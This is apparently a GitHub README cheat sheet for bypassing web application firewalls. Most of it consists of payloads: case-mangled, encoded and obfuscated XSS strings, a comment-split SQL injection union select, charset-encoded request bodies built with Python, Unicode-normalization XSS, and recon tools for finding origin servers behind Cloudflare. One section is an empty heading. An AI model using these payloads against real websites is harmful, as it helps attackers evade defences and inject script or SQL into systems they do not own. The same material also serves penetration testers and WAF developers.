<h1 align="center">
  <br>
  <a href=""><img src="/img/logo.png" alt="" width="300px;"></a>
  <br>
  <img src="https://img.shields.io/badge/PRs-welcome-blue">
  <img src="https://img.shields.io/github/last-commit/kh4sh3i/WAF-Bypass">
  <img src="https://img.shields.io/github/commit-activity/m/kh4sh3i/WAF-Bypass">
  <a href="https://twitter.com/intent/follow?screen_name=kh4sh3i_"><img src="https://img.shields.io/twitter/follow/kh4sh3i_?style=flat&logo=twitter"></a>
  <a href="https://github.com/kh4sh3i"><img src="https://img.shields.io/github/stars/kh4sh3i?style=flat&logo=github"></a>
</h1>


# WAF-Bypass
🔥 Web application firewalls (WAFs) bypass


## Bypassing WAFs

### 1.Regex Bypasses
Different techniques can be used to bypass the regex filters on the firewalls. Examples include alternating case, adding line breaks, and encoding payloads. Resources for the various bypasses can be found at PayloadsAllTheThings and OWASP.

```
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
```


## 2.Obfuscation
While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.



```
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```



```
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```


## 3.Charset Encoding
This technique involves modifying the Content-Type header to use a different charset (e.g. ibm500). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python


```
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```



## 4.Unicode Compatability
Depending on the implementation of Unicode normalization, characters that share Unicode compatability may be able to bypass the WAF and execute as the intended payload.

```
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```


## 5. Content Size
In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.



## 11. Uninitialized Variables Technique




## Tools
* [w3af](https://github.com/andresriancho/w3af) — Web Application Attack and Audit Framework

* [wafw00f](https://github.com/EnableSecurity/wafw00f) — Identify and fingerprint Web Application Firewall

* [BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) – Bypass firewalls by abusing DNS history. This tool will search for old DNS A records and check if the server replies for that domain.

* [CloudFail](https://github.com/m0rtem/CloudFail) – is a tactical reconnaissance tool that tries to find the original IP address behind the Cloudflare WAF.



